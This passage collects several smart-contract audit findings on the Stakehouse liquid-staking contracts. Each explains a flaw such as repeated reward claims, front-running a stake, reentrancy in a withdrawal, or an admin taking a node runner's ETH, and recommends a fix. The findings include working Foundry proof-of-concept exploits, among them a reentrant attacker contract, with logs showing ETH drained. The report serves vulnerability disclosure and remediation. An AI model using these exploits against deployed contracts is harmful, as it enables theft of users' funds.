600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 0   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000    depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0   Test result: FAILED. 0 passed; 1 failed; finished in 15.64ms  Failing tests: Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)  Encountered a total of 1 failing tests, 0 tests succeeded  ```  ## Tools Used Manual review / forge test  ## Recommended Mitigation Steps  The `SyndicateRewardsProcessor` contract should be modified as follows: ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..9b9c502 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due;                    totalClaimed += due;    ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882 https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22   # Vulnerability details  ## Impact `LiquidStakingManager._autoStakeWithSyndicate` always stakes a fixed amount of 12 ETH. However, `Syndicate.stake` only allows a total staking amount of 12 ETH and reverts otherwise: ```solidity if (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount(); ``` An attacker can abuse this and front-run calls to `mintDerivatives` (which call `_autoStakeWithSyndicate` internally). Because `Syndicate.stake` can be called by everyone, he can stake the minimum amount (1 gwei) such that the `mintDerivatives` call fails.  ## Proof Of Concept As soon as there is a `mintDerivatives` call in the mempool, an attacker (that owns sETH) calls `Syndicate.stake` with an amount of 1 gwei. `_autoStakeWithSyndicate` will still call `Syndicate.stake` with 12 ether. However, `_sETHAmount + totalStaked > 12 ether` will then be true, meaning that the call will revert.  ## Recommended Mitigation Steps Only allow staking through the LiquidStakingManager, i.e. add access control to `Syndicate.stake`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L469   # Vulnerability details  ## Impact In `registerBLSPublicKeys`, it should be checked (according to the comment and error) if a BLS public key is part of the LSD network and not banned: ```solidity // check if the BLS public key is part of LSD network and is not banned require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, "BLS public key is banned or not a part of LSD network"); ``` However, this is not actually checked. The function `isBLSPublicKeyPartOfLSDNetwork` only checks if the public key is part of the LSD network: ```solidity function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0); } ``` The function `isBLSPublicKeyBanned` would perform both checks and should be called here: ```solidity function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0); } ```  Because of that, it is possible to pass banned BLS public keys to `registerBLSPublicKeys` and the call will succeed.  ## Recommended Mitigation Steps Use `isBLSPublicKeyBanned` instead of `isBLSPublicKeyPartOfLSDNetwork`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940   # Vulnerability details  ## Impact  The user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.  After the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:  ```solidity /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network) /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract function stake(  bytes[] calldata _blsPublicKeyOfKnots,  bytes[] calldata _ciphertexts,  bytes[] calldata _aesEncryptorKeys,  IDataStructures.EIP712Signature[] calldata _encryptionSignatures,  bytes32[] calldata _dataRoots ) external { ```  before the staking, the validation function is called:  ```solidity // check minimum balance of smart wallet, dao staking fund vault and savETH vault _assertEtherIsReadyForValidatorStaking(blsPubKey); ```  which calls:  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");  require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");  require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault"); } ```  note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens  note that stakingFundVault inherits from ETHPoolFactory.sol  ```solidity contract StakingFundsVault is     Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, ```  so user call rotateLPTokens on StakingFundsVault  ```solidity /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked /// @param _oldLPToken Instance of the old LP token (to be burnt) /// @param _newLPToken Instane of the new LP token (to be minted) /// @param _amount Amount of LP tokens to be rotated/converted from old to new function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {  require(address(_oldLPToken) != address(0), "Zero address");  require(address(_newLPToken) != address(0), "Zero address");  require(_oldLPToken != _newLPToken, "Incorrect rotation to same token");  require(_amount >= MIN_STAKING_AMOUNT, "Amount cannot be zero");  require(_amount <= _oldLPToken.balanceOf(msg.sender), "Not enough balance");  require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Liquidity is still fresh");  require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  note the line:  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  the correct implementaton should be:  ```solidity require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens"); ```  The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.  ```solidity /// @dev Initialization logic function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {  require(address(_liquidStakingNetworkManager) != address(0), "Zero Address");  require(address(_lpTokenFactory) != address(0), "Zero Address");   liquidStakingNetworkManager = _liquidStakingNetworkManager;  lpTokenFactory = _lpTokenFactory;   baseLPTokenName = "ETHLPToken_";  baseLPTokenSymbol = "ETHLP_";  maxStakingAmountPerValidator = 4 ether; } ```  note the line:  ```solidity maxStakingAmountPerValidator = 4 ether; ```  this parameter maxStakingAmountPerValidator restrict user's ETH deposit amount  ```solidity     /// @dev Internal business logic for processing staking deposits for single or batch deposits function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {  require(_amount >= MIN_STAKING_AMOUNT, "Min amount not reached");  require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");   // LP token issued for the KNOT  // will be zero for a new KNOT because the mapping doesn't exist  LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];  if(address(lpToken) != address(0)) {   // KNOT and it's LP token is already registered   // mint the respective LP tokens for the user    // total supply after minting the LP token must not exceed maximum staking amount per validator   require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");    // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied   lpToken.mint(msg.sender, _amount);   emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);  }  else {   // check that amount doesn't exceed max staking amount per validator   require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");   ```  note the line:  ```solidity require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");  ```  However, such restriction when rotating LP is changed to  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  **so to sum it up:**  When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)  ## Proof of Concept  First we need to add the import in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";  import "../../contracts/liquid-staking/StakingFundsVault.sol"; import "../../contracts/liquid-staking/LPToken.sol"; ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  **then we add the POC:**  ```solidity function test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {   address user = vm.addr(21312);   bytes memory blsPubKeyOne = fromHex("94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");  bytes memory blsPubKeyTwo = fromHex("9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");   bytes[] memory publicKeys = new bytes[](2);  publicKeys[0] = blsPubKeyOne;  publicKeys[1] = blsPubKeyTwo;   bytes[] memory signature = new bytes[](2);  signature[0] = "signature";  signature[1] = "signature";   // user spends 8 ether and register two keys to become the public operator  vm.prank(user);  vm.deal(user, 8 ether);  manager.registerBLSPublicKeys{value: 8 ether}(   publicKeys,   signature,   user  );   // active two keys  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);   // deposit 4 ETH for public key one and public key two  StakingFundsVault stakingFundsVault = manager.stakingFundsVault();  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);   // to bypass the error: "Liquidity is still fresh"  vm.warp(1 days);   // rotate staking amount from public key one to public key two  // LP total supply for public key two exceed 4 ETHER  LPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);  LPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);  stakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);   uint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();  console.log("total supply of the Staking fund LP exists 4 ETHER.");  console.log(totalSupply);   // calling TestUtils.sol#stakeSingleBlsPubKey, revert  stakeSingleBlsPubKey(blsPubKeyTwo);  } ```  We run the POC:  ```solidity forge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC ```  the output is:  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) Logs:   total supply of the Staking fund LP exists 4 ETHER.   8000000000000000000  Test result: FAILED. 0 passed; 1 failed; finished in 15.73ms  Failing tests: Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) ```  the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether"); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend the project change from  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens"); ```  to  ```solidity require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens"); ```  and change from  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");  require(stakingFundsLP.totalSupply() >= 4 ether, "DAO staking funds vault balance must be at least 4 ether");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");  require(savETHVaultLP.totalSupply() >= 24 ether, "KNOT must have 24 ETH in savETH vault"); } ```  we change from == balance check to >=, because == balance check is too strict in this case.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90   # Vulnerability details  ## Impact  The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ``` But it will decrease the `idleETH` first and then burn the lpTokenETH in the function `GiantMevAndFeesPool.withdrawETH`. The lpTokenETH burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept I wrote a test file for proof, but there is another bug/vulnerability which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named "GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool". You should fix it first by modifying the code https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166 to : ``` if (_to != address(0)) {     _distributeETHRewardsToUserForToken(         _to,         address(lpTokenETH),         lpTokenETH.balanceOf(_to),         _to     ); } ``` I know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.  test: test/foundry/TakeFromGiantPools2.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import "forge-std/console.sol"; import {GiantPoolTests} from "./GiantPools.t.sol";  contract TakeFromGiantPools2 is GiantPoolTests {     function testDWUpdateRate2() public{         address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);         // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         giantFeesAndMevPool.withdrawETH(4 ether);         vm.stopPrank();         console.log("user one:", getBalance(feesAndMevUserOne));         console.log("user two(attacker):", getBalance(feesAndMevUserTwo));         console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // just ETH         return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ``` run test: ``` forge test --match-test testDWUpdateRate2 -vvv ```  test log: ``` Logs:   user one: 0   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 2000000000000000000 ```  The attacker stole 2 eth from the pool.  ## Tools Used foundry  ## Recommended Mitigation Steps `idleETH -= _amount;` should be after the `lpTokenETH.burn`.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158   # Vulnerability details  ## Impact withdrawUnusedETHToGiantPool will withdraw any eth from the vault if staking has not commenced(knot status is INITIALS_REGISTERED), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.   ## Proof of Concept place poc in GiantPools.t.sol with `import { MockStakingFundsVault } from "../../contracts/testing/liquid-staking/MockStakingFundsVault.sol";`   ```solidity     function testStuckFundsInGiantMEV() public {          stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address victim = accountFour; vm.deal(victim, 1 ether);           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          emit log_address(address(giantFeesAndMevPool));         vm.startPrank(victim);          emit log_uint(victim.balance);         giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          emit log_uint(victim.balance);           vm.warp(block.timestamp + 60 minutes);         LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));         LPToken [][] memory lpToken = new LPToken[][](1);         LPToken[] memory temp  = new LPToken[](1);         temp[0] = lp;         lpToken[0] = temp;          emit log_uint(address(giantFeesAndMevPool).balance);         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);          emit log_uint(address(giantFeesAndMevPool).balance);         vm.expectRevert();         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          vm.expectRevert();         giantSavETHPool.withdrawETH(1 ether);          vm.stopPrank();     }   ```  both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH  Note that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.  ## Tools Used  Foundry  ## Recommended Mitigation Steps update `idleETH`  in withdrawUnusedETHToGiantPool
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347   # Vulnerability details  ## Impact  Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet  ## Proof of Concept  the code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.  ```solidity     /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.     /// @dev A banned node runner cannot withdraw ETH for the KNOT.      /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {         require(_recipient != address(0), "Zero address");         require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");          address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];         require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");         require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");         require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             "Initials not registered"         );          // refund 4 ether from smart wallet to node runner's EOA         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             "",             4 ether         );          // update the mapping         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;          emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);     } ```  note the section:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether );  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet; ```  if the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.  As shown in our running POC.  We need to add the import first:   ```solidity import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol"; ```  We can add the smart contract below:  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity interface IManager {     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable;     function withdrawETHForKnot(         address _recipient,          bytes calldata _blsPublicKeyOfKnot     ) external; }  contract NonEOARepresentative {      address manager;     bool state;      constructor(address _manager) payable {          bytes[] memory publicKeys = new bytes[](2);         publicKeys[0] = "publicKeys1";         publicKeys[1] = "publicKeys2";          bytes[] memory signature = new bytes[](2);         signature[0] = "signature1";         signature[1] = "signature2";          IManager(_manager).registerBLSPublicKeys{value: 8 ether}(             publicKeys,             signature,             address(this)         );          manager = _manager;      }      function withdraw(bytes calldata _blsPublicKeyOfKnot) external {         IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);     }      receive() external payable {         if(!state) {             state = true;             this.withdraw("publicKeys1");         }     }  } ```  there is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.  We add the test case.  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  ```solidity function testBypassIsContractCheck_POC() public {   NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));  address wallet = manager.smartWalletOfNodeRunner(address(pass));  address reprenstative = manager.smartWalletRepresentative(wallet);  console.log("smart contract registered as a EOA representative");  console.log(address(reprenstative) == address(pass));   // to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED  MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);   // expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER  pass.withdraw("publicKeys1");  console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");  console.log(address(pass).balance);  } ```  we run the test:  ```solidity forge test -vv --match testWithdraw_Reentrancy_POC ```  and the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testWithdraw_Reentrancy_POC() (gas: 578021) Logs:   smart contract registered as a EOA representative   true   balance after the withdraw, expected 4 ETH, but has 8 ETH   8000000000000000000  Test result: ok. 1 passed; 0 failed; finished in 14.85ms ```  the function call is   pass.withdraw("publicKeys1"), which calls  ```solidity function withdraw(bytes calldata _blsPublicKeyOfKnot) external {  IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot); } ```  which trigger:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```  which triggers reentrancy to withdraw the fund again before the public key is banned.  ```solidity receive() external payable {  if(!state) {   state = true;   this.withdraw("publicKeys1");  } } ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.  ```solidity  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;  // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377   # Vulnerability details  ## Impact DAO or lsd network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner.   ## Proof of Concept there are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.  place poc in LiquidStakingManager.sol  ```solidity     function testDaoCanTakeNodeRunner4ETH() public {         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address attacker = accountFour;           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          vm.startPrank(admin);         manager.rotateNodeRunnerOfSmartWallet(nodeRunner, attacker, true);          vm.stopPrank();          vm.startPrank(attacker);         emit log_uint(attacker.balance);         manager.withdrawETHForKnot(attacker,blsPubKeyOne);         emit log_uint(attacker.balance);         vm.stopPrank();     }  ```  ## Tools Used  forge  ## 